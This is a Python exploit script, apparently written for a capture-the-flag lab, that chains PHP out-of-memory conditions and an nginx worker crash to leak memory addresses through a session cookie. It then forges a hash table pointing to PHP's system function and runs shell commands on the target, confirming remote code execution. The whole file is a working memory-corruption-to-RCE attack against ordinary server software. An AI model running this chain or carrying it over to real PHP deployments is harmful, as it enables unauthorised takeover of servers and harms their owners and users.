#!/usr/bin/env python3

from __future__ import annotations

import argparse
from dataclasses import dataclass
from datetime import datetime, timezone
import http.client
from pathlib import Path
import secrets
import string
import time

import exploit_primitives as exploit
from exploit_chain import OOM_MARKER, PayloadError, PayloadSet, ensure_request_size
from http_transport import HttpRequest, HttpResponse, HttpTarget, PersistentHttpClient

SESSION_ALPHABET = string.ascii_letters + string.digits + ",-"

@dataclass(frozen=True, slots=True)
class SessionIds:
    crash: bytes
    leak: bytes
    execute: bytes

    @classmethod
    def create(cls, crash: str | None, leak: str | None, execute: str | None) -> SessionIds:
        crash_value = parse_session_id(crash, 1) if crash else random_session_id(1)
        leak_value = parse_session_id(leak, 1) if leak else random_session_id(1, {crash_value})
        execute_value = parse_session_id(execute, 32) if execute else random_session_id(32)
        if crash_value == leak_value:
            raise ValueError("crash and leak session IDs must differ")
        return cls(crash_value, leak_value, execute_value)

@dataclass(frozen=True, slots=True)
class RestartProofConfig:
    target: HttpTarget
    endpoint: str
    readiness_path: str
    expected_version: str
    profile: exploit.PhpBinaryProfile
    timeout: float
    restart_delay: float
    crash_leak_length: int
    leak_length: int
    b1_fillers: int
    use_proxy: bool
    upstream_header: str
    sessions: SessionIds
    proof_log: Path
    leak_file: Path

@dataclass(frozen=True, slots=True)
class RestartProof:
    leak: exploit.AddressLeak
    upstream: str | None
    crash_statuses: tuple[int, ...]
    proof_statuses: tuple[int, ...]
    output: bytes

class RestartProofError(RuntimeError):
    pass

class RestartProofRunner:
    def __init__(self, config: RestartProofConfig):
        self.config = config
        self.crash_payloads = PayloadSet.create(config.sessions.crash, config.sessions.execute)
        self.proof_payloads = PayloadSet.create(config.sessions.leak, config.sessions.execute)
        self.query = "&".join(f"q{index:04d}=v" for index in range(8))
        self.transcript: list[str] = []

    def run(self) -> None:
        self.config.proof_log.unlink(missing_ok=True)
        self.config.leak_file.unlink(missing_ok=True)
        self.crash_payloads.validate()
        self.proof_payloads.validate()
        self.transcript = [
            "RESTART-ASSISTED php2shell proof",
            "utc=" + datetime.now(timezone.utc).isoformat(),
            "target=" + self.config.target.origin + self.config.endpoint,
            "profile=" + self.config.profile.name,
            "session_ids=" + "/".join(value.decode("ascii") for value in (self.config.sessions.crash, self.config.sessions.leak, self.config.sessions.execute)),
            self.proof_payloads.size_line(),
        ]
        with PersistentHttpClient(self.config.target, self.config.timeout, self.config.use_proxy) as client:
            warm = client.get(self.config.readiness_path)
            require_readiness(warm, self.config.expected_version)
            upstream = warm.header(self.config.upstream_header)
            crash_responses = self.recycle(client, upstream)
            time.sleep(self.config.restart_delay)
            proof = self.prove(client, upstream, crash_responses)
        self.complete(proof)

    def recycle(self, client: PersistentHttpClient, upstream: str | None) -> tuple[HttpResponse, ...]:
        stages = (
            HttpRequest.post(self.config.endpoint, self.crash_payloads.seed, exploit.BOUNDARY),
            HttpRequest.get(self.config.readiness_path),
            HttpRequest.post(self.config.endpoint + "?" + self.query, self.crash_payloads.a1, b"C"),
            HttpRequest.post(self.config.endpoint + "?" + exploit.b1_query(self.config.crash_leak_length, self.config.b1_fillers), self.crash_payloads.b1, exploit.BOUNDARY),
        )
        responses = tuple(client.pipeline((stage,))[0] for stage in stages)
        seed, readiness, a1, crash = responses
        require_oom("crash seed", seed)
        require_readiness(readiness, self.config.expected_version)
        require_oom("crash A1", a1)
        require_upstream(upstream, responses, self.config.upstream_header)
        if crash.status != 502:
            raise RestartProofError(f"crash B1 returned HTTP {crash.status} instead of 502")
        if crash.closes_connection:
            raise RestartProofError("nginx closed the downstream connection after the worker crash")
        print(f"recycle statuses={'/'.join(str(response.status) for response in responses)} upstream={upstream or 'unreported'}", flush=True)
        return responses

    def prove(self, client: PersistentHttpClient, upstream: str | None, crash_responses: tuple[HttpResponse, ...]) -> RestartProof:
        stages = (
            HttpRequest.post(self.config.endpoint, self.proof_payloads.seed, exploit.BOUNDARY),
            HttpRequest.get(self.config.readiness_path),
            HttpRequest.post(self.config.endpoint + "?" + self.query, self.proof_payloads.a1, b"C"),
            HttpRequest.post(self.config.endpoint + "?" + exploit.b1_query(self.config.leak_length, self.config.b1_fillers), self.proof_payloads.b1, exploit.BOUNDARY),
        )
        seed, readiness, a1, b1 = client.pipeline(stages)
        require_oom("seed", seed)
        require_readiness(readiness, self.config.expected_version)
        require_oom("A1", a1)
        require_oom("B1", b1)
        require_upstream(upstream, (seed, readiness, a1, b1), self.config.upstream_header)
        cookie = b1.session_cookie()
        if len(cookie) != self.config.leak_length:
            raise RestartProofError(f"B1 returned a {len(cookie)}-byte session cookie")
        self.config.leak_file.write_bytes(cookie)
        self.config.leak_file.chmod(0o600)
        leak = exploit.parse_leaked_cookie(cookie, self.config.profile)
        nonce = secrets.token_hex(8)
        command = f"echo {nonce};id;echo {nonce}-flag;print-flag&&echo {nonce}-end".encode()
        b2_body = exploit.build_b2(leak.fake_hash_table, leak.zif_system, command, self.config.sessions.execute)
        ensure_request_size("B2", b2_body)
        a2, b2 = client.pipeline(
            (
                HttpRequest.post(self.config.endpoint, self.proof_payloads.a2, exploit.BOUNDARY),
                HttpRequest.post(self.config.endpoint, b2_body, exploit.BOUNDARY, True),
            )
        )
        require_oom("A2", a2)
        require_upstream(upstream, (a2, b2), self.config.upstream_header)
        output = validate_callback(b2, nonce)
        return RestartProof(
            leak,
            upstream,
            tuple(response.status for response in crash_responses),
            (seed.status, readiness.status, a1.status, b1.status, a2.status, b2.status),
            output,
        )

    def complete(self, proof: RestartProof) -> None:
        address_line = f"main={proof.leak.main_chunk:#x} php={proof.leak.php_base:#x} zif_system={proof.leak.zif_system:#x}"
        self.transcript.extend(
            (
                "crash_statuses=" + "/".join(str(status) for status in proof.crash_statuses),
                "proof_statuses=" + "/".join(str(status) for status in proof.proof_statuses),
                "upstream=" + (proof.upstream or "unreported"),
                address_line,
                "response=" + proof.output.decode("utf-8", "backslashreplace").strip(),
                "RESULT=RESTART_ASSISTED_RCE_CONFIRMED",
            )
        )
        self.config.proof_log.write_text("\n".join(self.transcript) + "\n", encoding="utf-8")
        for line in self.transcript[-6:]:
            print(line, flush=True)
        print(f"proof_log={self.config.proof_log}", flush=True)

def require_oom(stage: str, response: HttpResponse) -> None:
    if OOM_MARKER not in response.body:
        raise RestartProofError(f"{stage} OOM was not observed (HTTP {response.status}, {len(response.body)} bytes)")

def require_readiness(response: HttpResponse, expected_version: str) -> None:
    marker = ("PHP " + expected_version).encode()
    if response.status != 200 or marker not in response.body:
        raise RestartProofError(f"readiness check failed (HTTP {response.status})")

def require_upstream(expected: str | None, responses: tuple[HttpResponse, ...], header: str) -> None:
    if expected is None:
        return
    observed = tuple(response.header(header) for response in responses)
    if any(value != expected for value in observed):
        raise RestartProofError(f"upstream changed from {expected} to {observed}")

def validate_callback(response: HttpResponse, nonce: str) -> bytes:
    start = nonce.encode()
    flag_marker = (nonce + "-flag").encode()
    end = (nonce + "-end").encode()
    if response.status != 200 or start not in response.body or flag_marker not in response.body or end not in response.body:
        raise RestartProofError(f"B2 callback was not verified (HTTP {response.status}, {len(response.body)} bytes)")
    output = response.body.split(start, 1)[1].split(end, 1)[0]
    identity, flag = output.split(flag_marker, 1)
    if b"uid=" not in identity or not flag.strip():
        raise RestartProofError("B2 callback did not include identity and print-flag output")
    return identity.strip() + b"\n" + flag.strip()

def parse_session_id(value: str, length: int) -> bytes:
    if len(value) != length or any(character not in SESSION_ALPHABET for character in value):
        raise ValueError(f"session ID must contain exactly {length} valid characters")
    return value.encode("ascii")

def random_session_id(length: int, excluded: set[bytes] | None = None) -> bytes:
    excluded = excluded or set()
    while True:
        value = "".join(secrets.choice(SESSION_ALPHABET) for _ in range(length)).encode()
        if value not in excluded:
            return value

def integer(value: str) -> int:
    return int(value, 0)

def parse_config() -> RestartProofConfig:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://127.0.0.1:18083")
    parser.add_argument("--endpoint", default="/ping.php")
    parser.add_argument("--readiness-path", default="/php-version.php")
    parser.add_argument("--expected-version", default="8.4.26")
    parser.add_argument("--profile", choices=tuple(exploit.PHP_BINARY_PROFILES), default="alpine")
    parser.add_argument("--timeout", type=float, default=60)
    parser.add_argument("--restart-delay", type=float, default=11)
    parser.add_argument("--crash-leak-length", type=integer, default=0x4000)
    parser.add_argument("--leak-length", type=integer, default=0x440)
    parser.add_argument("--b1-fillers", type=int, default=5)
    parser.add_argument("--direct", action="store_true")
    parser.add_argument("--upstream-header", default="X-Upstream")
    parser.add_argument("--crash-session-id")
    parser.add_argument("--leak-session-id")
    parser.add_argument("--execute-session-id")
    parser.add_argument("--proof-log", type=Path, default=Path(__file__).resolve().with_name("restart-proof.log"))
    parser.add_argument("--leak-file", type=Path, default=Path(__file__).resolve().with_name("restart-leak.bin"))
    arguments = parser.parse_args()
    if arguments.timeout <= 0 or arguments.restart_delay < 0 or arguments.crash_leak_length < 32 or arguments.leak_length < 32 or arguments.b1_fillers < 0:
        parser.error("timeouts, leak lengths, and filler count must be valid")
    try:
        sessions = SessionIds.create(arguments.crash_session_id, arguments.leak_session_id, arguments.execute_session_id)
    except ValueError as error:
        parser.error(str(error))
    return RestartProofConfig(
        HttpTarget.parse(arguments.target),
        arguments.endpoint,
        arguments.readiness_path,
        arguments.expected_version,
        exploit.PHP_BINARY_PROFILES[arguments.profile],
        arguments.timeout,
        arguments.restart_delay,
        arguments.crash_leak_length,
        arguments.leak_length,
        arguments.b1_fillers,
        not arguments.direct,
        arguments.upstream_header,
        sessions,
        arguments.proof_log,
        arguments.leak_file,
    )

def main() -> int:
    try:
        RestartProofRunner(parse_config()).run()
    except (OSError, PayloadError, RestartProofError, ValueError, http.client.HTTPException) as error:
        raise SystemExit(str(error)) from None
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
